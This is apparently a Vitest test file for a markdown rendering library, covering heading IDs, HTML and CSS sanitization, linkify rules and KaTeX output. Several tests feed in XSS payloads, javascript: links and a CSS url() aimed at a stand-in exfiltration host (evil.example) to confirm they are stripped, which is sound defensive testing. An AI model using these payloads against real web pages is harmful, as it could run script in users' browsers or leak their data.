import { describe, expect, it } from 'vitest'
import {
  extractHeadings,
  renderMarkdown,
  sanitizeHtml,
  slugifyHeading,
} from '../index'

describe('slugifyHeading', () => {
  it('lowercases ASCII text', () => {
    expect(slugifyHeading('Hello World')).toBe('hello-world')
  })

  it('trims leading and trailing whitespace before slugifying', () => {
    expect(slugifyHeading('   Hello World   ')).toBe('hello-world')
    expect(slugifyHeading('\tFoo\n')).toBe('foo')
  })

  it('collapses runs of non-alphanumeric chars to a single hyphen', () => {
    expect(slugifyHeading('Hello!! World??')).toBe('hello-world')
    expect(slugifyHeading('foo   bar')).toBe('foo-bar')
  })

  it('preserves Chinese characters in the CJK Unified Ideographs block', () => {
    expect(slugifyHeading('你好 世界')).toBe('你好-世界')
    expect(slugifyHeading('测试标题')).toBe('测试标题')
  })

  it('returns an empty string when input has no slug-safe characters', () => {
    expect(slugifyHeading('')).toBe('')
    expect(slugifyHeading('   ')).toBe('')
    expect(slugifyHeading('!!!')).toBe('')
  })

  it('produces IDs that match the heading renderer output', () => {
    const samples = [
      'Hello World',
      '  Trimmed  ',
      '你好',
      'Mixed 中文 Title',
      '100%',
    ]
    for (const sample of samples) {
      const slug = slugifyHeading(sample)
      const html = renderMarkdown(`## ${sample}`)
      const match = html.match(/<h2[^>]*id="([^"]+)"/)
      expect(match, `renderer produced no id for "${sample}"`).not.toBeNull()
      expect(match![1]).toBe(slug)
    }
  })

  it('matches the renderer even when the markdown uses closing hashes', () => {
    const slug = slugifyHeading('Heading')
    const html = renderMarkdown('## Heading ##\n')
    expect(html).toContain(`id="${slug}"`)
  })
})

describe('extractHeadings', () => {
  it('returns an empty list for empty or nullish input', () => {
    expect(extractHeadings('')).toEqual([])
    expect(extractHeadings(null as unknown as string)).toEqual([])
    expect(extractHeadings(undefined as unknown as string)).toEqual([])
  })

  it('extracts ## and ### headings by default with their level', () => {
    const headings = extractHeadings('## One\n\nSome text\n\n### Two\n')
    expect(headings).toEqual([
      { id: 'one', text: 'One', level: 2 },
      { id: 'two', text: 'Two', level: 3 },
    ])
  })

  it('ignores h1 and h4+ by default', () => {
    const md = '# Title\n## Section\n#### Deep\n##### Deeper\n'
    const headings = extractHeadings(md)
    expect(headings.map((h) => h.level)).toEqual([2])
    expect(headings[0]?.text).toBe('Section')
  })

  it('respects a custom level range via options.levels', () => {
    const md = '# Title\n## Section\n### Sub\n#### Deep'
    const headings = extractHeadings(md, { levels: [1, 4] })
    expect(headings.map((h) => `${h.level}:${h.text}`)).toEqual([
      '1:Title',
      '4:Deep',
    ])
  })

  it('rejects heading levels outside the markdown range', () => {
    expect(() => extractHeadings('# Heading', { levels: [1, 7] })).toThrow(
      'Heading levels must be integers from 1 to 6',
    )
  })

  it('rejects heading levels outside the markdown range', () => {
    expect(() => extractHeadings('# Heading', { levels: [1, 7] })).toThrow(
      'Heading levels must be integers from 1 to 6',
    )
  })

  it('keeps IDs aligned when filtered headings follow another level', () => {
    const md = '# Hello\n\n## Hello'
    expect(extractHeadings(md)).toEqual([
      { id: 'hello-2', text: 'Hello', level: 2 },
    ])
    expect(renderMarkdown(md)).toContain('id="hello-2"')
  })

  it('skips headings inside fenced code blocks', () => {
    const md = [
      '## Real',
      '',
      '```',
      '## NotAHeading',
      '### AlsoNot',
      '```',
      '',
      '## RealTwo',
    ].join('\n')
    const headings = extractHeadings(md)
    expect(headings.map((h) => h.text)).toEqual(['Real', 'RealTwo'])
  })

  it('handles balanced fence toggles with leading whitespace', () => {
    const md = ['## A', '   ```', '## B', '   ```', '## C'].join('\n')
    const headings = extractHeadings(md)
    expect(headings.map((h) => h.text)).toEqual(['A', 'C'])
  })

  it('keeps tilde and other fence markers closed when odd', () => {
    const md = ['## A', '~~~', '## B', '~~~', '## C'].join('\n')
    const headings = extractHeadings(md)
    expect(headings.map((h) => h.text)).toEqual(['A', 'C'])
  })

  it('deduplicates identical headings with -2, -3 suffixes', () => {
    const md = '## Hello\n\n## Hello\n\n## Hello\n'
    const headings = extractHeadings(md)
    expect(headings.map((h) => h.id)).toEqual(['hello', 'hello-2', 'hello-3'])
    expect(headings.map((h) => h.text)).toEqual(['Hello', 'Hello', 'Hello'])
  })

  it('does not collide IDs that differ only by punctuation', () => {
    const md = '## Hello World\n\n## Hello-World\n'
    const headings = extractHeadings(md)
    expect(headings.map((h) => h.id)).toEqual(['hello-world', 'hello-world-2'])
  })

  it('counts duplicates only inside the heading range by default', () => {
    const md = '## Hello\n\n## Different\n\n## Hello\n'
    const headings = extractHeadings(md)
    expect(headings.map((h) => h.id)).toEqual([
      'hello',
      'different',
      'hello-2',
    ])
  })

  it('strips leading/trailing hash marks the renderer would never see', () => {
    const md = '## Real Heading'
    const headings = extractHeadings(md)
    expect(headings[0]).toEqual({ id: 'real-heading', text: 'Real Heading', level: 2 })
  })

  it('preserves inline markdown characters in extracted text', () => {
    const md = '## **Bold** title'
    const headings = extractHeadings(md)
    expect(headings[0]?.text).toBe('**Bold** title')
  })

  it('IDs always match the IDs renderMarkdown emits', () => {
    const md = [
      '## Hello',
      '',
      'Some body text',
      '',
      '## Hello',
      '',
      '## Hello',
      '',
      '### Mixed 中文',
    ].join('\n')
    const headings = extractHeadings(md)
    const html = renderMarkdown(md)
    for (const heading of headings) {
      const re = new RegExp(`<h\\d[^>]*id="${heading.id}"`)
      expect(html).toMatch(re)
    }
  })
})

describe('renderMarkdown heading IDs (renderer/extractor parity)', () => {
  it('emits deduped IDs when the same heading text appears multiple times', () => {
    const md = '## Hello\n\n## Hello\n\n## Hello\n'
    const html = renderMarkdown(md)
    expect(html).toContain('id="hello"')
    expect(html).toContain('id="hello-2"')
    expect(html).toContain('id="hello-3"')
  })

  it('does not bleed IDs across separate renderMarkdown calls', () => {
    const md = '## Hello'
    expect(renderMarkdown(md)).toContain('id="hello"')
    expect(renderMarkdown(md)).toContain('id="hello"')
    expect(renderMarkdown('## Hello\n\n## Hello')).toContain('id="hello-2"')
  })

  it('sanitizes a hostile heading payload and keeps the id slug-safe', () => {
    const payload = '## "><img src=x onerror=alert(1)>'
    const html = renderMarkdown(payload)

    // No executable markup can form: the raw <img is escaped to inert text,
    // never emitted as a live element, and no script tag survives.
    expect(html).not.toMatch(/<img[\s>]/i)
    expect(html).not.toMatch(/<script[\s>]/i)
    expect(html).toContain('&lt;img')

    // The id attribute is derived from slugifyHeading, so it cannot carry
    // quote/angle-bracket characters that would break out of the attribute.
    const idMatch = html.match(/<h2[^>]*id="([^"]*)"/)
    expect(idMatch, 'renderer produced no id for the hostile heading').not.toBeNull()
    const id = idMatch![1]
    expect(id).not.toMatch(/["'<>()=]/)
    expect(id).toBe(slugifyHeading('"><img src=x onerror=alert(1)>'))
  })

  it('still escapes raw script tags after the heading rewrite', () => {
    const html = renderMarkdown('## Hi\n\n<script>alert(1)</script>\n')
    expect(html).not.toMatch(/<script[\s>]/i)
    expect(html).toContain('&lt;script&gt;')
  })

  it('still strips javascript: hrefs after the heading rewrite', () => {
    const html = renderMarkdown('## Hi\n\n[bad](javascript:alert(1))\n')
    expect(html).not.toMatch(/href="javascript:/i)
  })
})

describe('sanitizeHtml', () => {
  it('removes script tags', () => {
    const out = sanitizeHtml('<div><script>x</script></div>')
    expect(out).not.toContain('<script>')
  })

  it('preserves basic formatting', () => {
    const out = sanitizeHtml('<p><strong>ok</strong></p>')
    expect(out).toContain('<strong>ok</strong>')
  })

  it('removes executable SVG content from sanitized output', () => {
    const out = sanitizeHtml(
      '<svg><script>alert(1)</script><a xlink:href="javascript:alert(1)">x</a></svg>',
    )
    expect(out).not.toMatch(/<script|javascript:/i)
  })

  it('does not treat raw SVG markup in markdown as HTML', () => {
    const out = renderMarkdown('<svg><script>alert(1)</script></svg>')
    expect(out).not.toMatch(/<svg|<script/i)
  })

  it('removes on* attributes', () => {
    const out = sanitizeHtml('<a href="#" onclick="x">x</a>')
    expect(out).not.toMatch(/onclick/i)
  })
})

// `style` is allowed only so KaTeX can position its spans. DOMPurify keeps an
// allowed `style` attribute verbatim, so the declarations are narrowed by
// markdown-utils instead - and `sanitizeHtml` is exported, so these hold for
// every caller, not only for the KaTeX path.
describe('sanitizeHtml style attribute', () => {
  it('keeps the length declarations KaTeX emits', () => {
    const out = sanitizeHtml('<span style="height:0.8141em;top:-3.063em">x</span>')
    expect(out).toContain('height:0.8141em')
    expect(out).toContain('top:-3.063em')
  })

  it('drops a url() payload', () => {
    const out = sanitizeHtml('<span style="background:url(javascript:alert(1))">x</span>')
    expect(out).not.toMatch(/javascript:/i)
    expect(out).not.toContain('url(')
  })

  it('drops a remote url() that could exfiltrate', () => {
    const out = sanitizeHtml(
      '<span style="background:url(https://evil.example/collect?c=1)">x</span>',
    )
    expect(out).not.toContain('url(')
    expect(out).not.toContain('evil.example')
  })

  it('drops expression() and behavior:', () => {
    expect(sanitizeHtml('<span style="width:expression(alert(1))">x</span>')).not.toMatch(
      /expression/i,
    )
    expect(sanitizeHtml('<span style="behavior:url(#default#time2)">x</span>')).not.toMatch(
      /behavior/i,
    )
  })

  it('drops -moz-binding', () => {
    const out = sanitizeHtml(
      '<span style="color:red;-moz-binding:url(https://evil.example/x.xml#e)">x</span>',
    )
    expect(out).not.toMatch(/-moz-binding/i)
  })

  it('drops a fixed-position overlay', () => {
    const out = sanitizeHtml(
      '<span style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">x</span>',
    )
    expect(out).not.toMatch(/position\s*:/i)
    expect(out).not.toMatch(/z-index/i)
  })

  it('rejects a length of absurd magnitude', () => {
    const out = sanitizeHtml('<span style="height:999999999em;width:-999999999em">x</span>')
    expect(out).not.toMatch(/999999999/)
  })

  it('keeps a large but plausible length', () => {
    // A deep matrix legitimately stacks hundreds of em.
    const out = sanitizeHtml('<span style="height:500em">x</span>')
    expect(out).toContain('height:500em')
  })

  it('drops an entire non-allowlisted declaration', () => {
    const out = sanitizeHtml('<span style="color:red;height:1em">x</span>')
    expect(out).not.toMatch(/color\s*:/i)
    expect(out).toContain('height:1em')
  })

  it('cannot be reached by raw HTML in markdown, which is escaped', () => {
    const out = renderMarkdown('<span style="position:fixed;top:0">x</span>')
    expect(out).not.toMatch(/<span style/i)
    expect(out).toContain('&lt;span')
  })

  it('cannot be reached by KaTeX commands under the default trust setting', () => {
    for (const command of ['\\htmlStyle{color:red}{x}', '\\style{color:red}{x}', '\\htmlId{e}{x}']) {
      const out = renderMarkdown(`$${command}$`)
      expect(out, command).not.toMatch(/style="color/i)
      expect(out, command).not.toMatch(/id="e"/)
    }
  })
})

// `linkify: true` is user-visible behavior on problem statements, threads and
// comments. These lock the linkify-it 6 rules that markdown-it 15 enabled:
// fuzzy links off, no userinfo scanning, and Unicode punctuation ending a link.
describe('linkify', () => {
  it('linkifies a bare https URL that contains an underscore', () => {
    const html = renderMarkdown('see https://example.com/a_b')
    expect(html).toContain('<a href="https://example.com/a_b">')
  })

  it('does not fuzzy-link a host without a protocol', () => {
    const html = renderMarkdown('example.com/x')
    expect(html).not.toContain('<a href')
    expect(html).toContain('example.com/x')
  })

  it('does not fuzzy-link a www host without a protocol', () => {
    const html = renderMarkdown('www.example.com')
    expect(html).not.toContain('<a href')
    expect(html).toContain('www.example.com')
  })

  it('ends a link at a full-width CJK comma and keeps the trailing prose', () => {
    const html = renderMarkdown('访问 https://example.com，然后')
    expect(html).toContain('<a href="https://example.com">https://example.com</a>')
    expect(html).toContain('，然后')
  })

  it('ends a link at a full-width CJK closing bracket', () => {
    const html = renderMarkdown('访问 https://example.com）然后')
    expect(html).toContain('<a href="https://example.com">https://example.com</a>')
    expect(html).toContain('）然后')
  })

  it('never carries credentials from a userinfo URL into an href', () => {
    const html = renderMarkdown('see https://user:pass@example.com/x')
    expect(html).not.toMatch(/href="[^"]*:[^"]*@/i)
  })

  it('still autolinks a bare email address as mailto', () => {
    const html = renderMarkdown('mail me@example.com')
    expect(html).toContain('<a href="mailto:me@example.com">')
  })
})

describe('katex', () => {
  it('emits the KaTeX 0.18 class names the design-system stylesheet targets', () => {
    // KaTeX 0.18 renamed its internal classes without keeping aliases:
    // `.base` -> `.katex-base`, `.strut` -> `.katex-strut`, `.sizing` ->
    // `.katex-sizing` (121 rules). A 0.18 renderer against the 0.17 stylesheet
    // matches none of them and formula layout collapses with no error, so this
    // pins both sides to the same major.
    const html = renderMarkdown('$x^2$')
    expect(html).toContain('katex-base')
    expect(html).toContain('katex-strut')
    expect(html).toContain('katex-sizing')
  })

  it('renders display math with the display wrapper', () => {
    const html = renderMarkdown('$$\\int_0^1 x\\,dx$$')
    expect(html).toContain('katex-display')
  })

  it('does not leak a macro defined in an earlier render into a later one', () => {
    // The MarkdownIt instance is a module-level singleton, so a plugin that
    // does not reset its macro table between renders lets one problem's
    // `\gdef` change how the next problem's formulas typeset.
    renderMarkdown('$\\gdef\\leakedmacro{42}$')
    const next = renderMarkdown('$\\leakedmacro$')
    expect(next).not.toContain('42')
  })

  it('keeps the inline geometry KaTeX puts on its spans', () => {
    // KaTeX writes every glyph height, depth and offset as an inline style.
    // Dropping the attribute collapses a formula onto one line: numerators,
    // superscripts and matrix rows lose their vertical position while the rest
    // of the page still renders, so the math is silently wrong rather than
    // visibly missing.
    const html = renderMarkdown('$\\frac{a}{b}$')
    expect(html).toMatch(/style="[^"]*height:/)
  })

  it('keeps the preserveAspectRatio that draws radicals and stretchy glyphs', () => {
    // These draw as an SVG with a 400000-unit-wide viewBox that has to be
    // sliced to a ~1em box. Without the attribute the SVG falls back to `meet`
    // and scales the whole box down to nothing, so the glyph disappears.
    // Big delimiters also use SVG but set width/height styles instead, so they
    // are not part of this contract. The value differs per glyph
    // (`xMinYMin slice`, `xMaxYMin slice`, `xMidYMin slice`, `none`), so only
    // presence is asserted; the editor strips the attribute entirely.
    for (const tex of ['\\sqrt{2}', '\\sqrt[3]{x}', '\\xrightarrow{a}', '\\overbrace{a+b}', '\\widehat{abc}']) {
      expect(renderMarkdown(`$${tex}$`), tex).toMatch(/preserveAspectRatio="/)
    }
    expect(renderMarkdown('$\\sqrt{2}$')).toContain('preserveAspectRatio="xMinYMin slice"')
  })

  it('caps user-specified sizes so a formula cannot stretch the page', () => {
    // KaTeX honours `\kern`, `\hspace`, `\rule` and `\raisebox` sizes, and the
    // sanitizer now preserves dimensions, so an untrusted statement could
    // otherwise emit a 1e9em box and an arbitrary scroll range.
    for (const tex of [
      '\\kern 999999999em x',
      '\\hspace{1000000000em}x',
      '\\rule{1em}{99999999em}',
      '\\raisebox{99999999em}{x}',
    ]) {
      const html = renderMarkdown(`$${tex}$`)
      const magnitudes = [...html.matchAll(/:(-?[\d.]+)em/g)].map((m) => Math.abs(Number(m[1])))
      expect(Math.max(0, ...magnitudes), tex).toBeLessThanOrEqual(200)
    }
  })

  it('leaves ordinary sizes alone', () => {
    // The cap must not disturb real typesetting, so sizes below it pass
    // through unchanged rather than being clamped to the cap.
    expect(renderMarkdown('$\\hspace{50em}x$')).toMatch(/margin-right:50em/)
    expect(renderMarkdown('$\\kern 30em x$')).toMatch(/margin-right:30em/)
    expect(renderMarkdown('$\\hspace{1.5em}x$')).toMatch(/margin-right:1\.5em/)
  })

  it('sanitizes hostile HTML next to math', () => {
    const html = renderMarkdown('$x^2$ <img src=x onerror=alert(1)> [x](javascript:alert(1))')
    expect(html).toContain('katex')
    expect(html).not.toMatch(/<img[\s>]/i)
    expect(html).not.toMatch(/<script[\s>]/i)
    expect(html).not.toMatch(/href="javascript:/i)
  })
})
